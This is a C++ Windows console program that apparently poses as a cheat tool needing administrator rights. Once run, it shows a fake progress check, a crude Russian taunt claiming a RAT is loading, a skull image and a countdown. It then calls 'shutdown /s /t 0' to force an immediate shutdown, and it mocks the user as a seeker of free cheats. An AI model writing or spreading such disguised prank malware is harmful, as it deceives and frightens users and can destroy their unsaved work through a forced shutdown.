#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <windows.h>
#include <cstdlib>

void SetConsoleColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroupSid = nullptr;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroupSid)) {
        return false;
    }

    if (!CheckTokenMembership(nullptr, adminGroupSid, &isAdmin)) {
        isAdmin = FALSE;
    }

    if (adminGroupSid) {
        FreeSid(adminGroupSid);
    }

    return isAdmin != FALSE;
}

void fakeLoading() {
    std::cout << "Checking for extraneous items ";
    for (int i = 0; i < 10; ++i) {
        std::cout << "$";
        std::cout.flush();
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    std::cout << std::endl;
}

void simulateError() {
    std::ifstream file("non_existent_file.txt");
    if (!file.is_open()) {
        fakeLoading();

        SetConsoleColor(12);

        std::cerr << "Dolbaeb? Rat loading... Pizda Tebe!" << std::endl;

        std::cout << R"(

                 888888888888
             8888888888888888888
          88888888888888888888888888
        8888888888888888888888888888888
       888888888888888888888888888888888
      88888888888888888888888888888888888
     8888888888888888888888888888888888886
      8888888888888888888888888886588888888
     888888888888888888888888___$___$___88
     88888888888888888888888_____$_$_____8
      8888888888888888:8886_______$_______8
        8888888_$___$____88______$_$______88
     88858_88____$_$_____8888___$___$____88888
      888888______$______:8_88_$_____$68888888
          88_____$_$____88____:888888888888888
          8_____$___$:888______8888888888888
            8__$_____888888_____:88888
             888888888888888___188888888
)" << std::endl;

        SetConsoleColor(7);

        std::cout << "Eto konechnaya dlya tebya" << std::endl;

        std::this_thread::sleep_for(std::chrono::seconds(2));

        std::cout << "1.." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(1));

        std::cout << "2.." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(1));

        std::cout << "3.." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(1));

        std::cout << "BABAX!!!" << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));

        system("shutdown /s /t 0");
    }
}

int main() {
    if (!IsRunAsAdmin()) {
        SetConsoleColor(12);
        std::cerr << "Error: The program must be run as administrator!" << std::endl;
        std::cerr << "Please restart the program with administrator rights." << std::endl;
        SetConsoleColor(7);

        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 1;
    }

    std::cout << "Starting program..." << std::endl;

    simulateError();

    std::cout << "Hahahaha, Pizda tebe lybitelb besplatnih 4itoB" << std::endl;

    std::cout << "Press Enter to exit...";
    std::cin.get();

    return 0;
}
